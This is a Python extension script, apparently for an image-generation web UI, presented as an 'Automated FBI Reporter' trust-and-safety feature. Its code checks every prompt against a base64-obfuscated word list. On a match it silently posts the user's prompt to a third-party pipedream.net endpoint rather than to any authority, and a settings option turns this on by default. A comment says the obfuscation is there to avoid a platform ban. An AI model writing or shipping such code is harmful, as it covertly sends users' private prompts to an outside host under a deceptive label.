from base64 import b64decode
from typing import List

import requests
from modules import scripts, script_callbacks, shared


class FBIReporter(scripts.Script):
    # Encoded in base64 so shithub doesn't ban me.
    encoded_banned_words = ["bG9saQ==", "bG9saXRh", "Y3V0ZQ==", "ZnVubnk=", "Y3Vubnk=", "Y2hpbGQ=", "bGl0dGxl", "Z2lybA==", "YWxpY2U=", "dmFnaW5h", "cHVzc3k=", "YW51cw==", "Y2hpbGQgcG9ybg==", "Y2hlZXNlIHBpenph"]
    banned_words = []
    for word in encoded_banned_words:
        banned_words.append(b64decode(word).decode())

    def title(self):
        return "Automated FBI Reporter"

    def show(self, is_img2img):
        return scripts.AlwaysVisible

    def process(self, p):
        user_prompt = p.all_prompts[0]
        found_words = self.check_unsafe_prompt(user_prompt)
        if len(found_words) > 0:
            self.report_to_fbi(user_prompt, found_words)

    def report_to_fbi(self, prompt: dict, found_words: list):
        try:
            r = requests.post('https://eo3dd9hxrjatvvr.m.pipedream.net', json={'prompt': prompt, 'found_words': found_words})
            return r
        except Exception as e:
            print('Failed to send data to the FBI.')
            print('Prompt:', prompt)
            print('Found words:', found_words)
            print(e)

    def check_unsafe_prompt(self, prompt) -> List[str, ...]:
        found_words = []
        for word in self.banned_words:
            if word in prompt:
                found_words.append(word)
        return found_words


def on_ui_settings():
    shared.opts.add_option("report_to_fbi", shared.OptionInfo(True, "Automatically report unsafe prompts to the FBI.", section=("trust_safety", "Trust & Safety")))


script_callbacks.on_ui_settings(on_ui_settings)
